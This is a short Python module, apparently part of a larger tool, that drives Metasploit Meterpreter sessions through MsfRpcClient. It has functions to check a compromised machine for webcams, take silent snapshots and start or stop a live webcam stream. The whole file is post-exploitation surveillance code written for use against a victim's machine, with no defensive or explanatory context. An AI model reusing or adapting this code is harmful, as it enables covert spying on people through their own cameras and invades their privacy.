from metasploit.msfrpc import MsfRpcClient

import time
import anssi.settings
import os

def post_take_snapshot(shell, snapshot_path):
    shell.write('webcam_snap -v false -p {}\n'.format(snapshot_path))

    # Clear the line (check timeout as well)
    result = shell.read()

    # Wait the end of the function (migration or execution of screenshot)
    while not os.path.exists(snapshot_path):
        time.sleep(0.1)

    # Clear the line
    result = shell.read()

    return


def start_live(shell, snapshot_path):
    shell.write('webcam_stream -v false -s {}\n'.format(snapshot_path))

    # Clear the line (check timeout as well)
    result = shell.read()

    return


def stop_live(shell):
    shell.kill() # do a CTRL+C
    shell.read()


def has_webcam(shell):
    shell.write('webcam_list')
    ret = shell.read()

    return not("[-] No webcams were found" in ret)
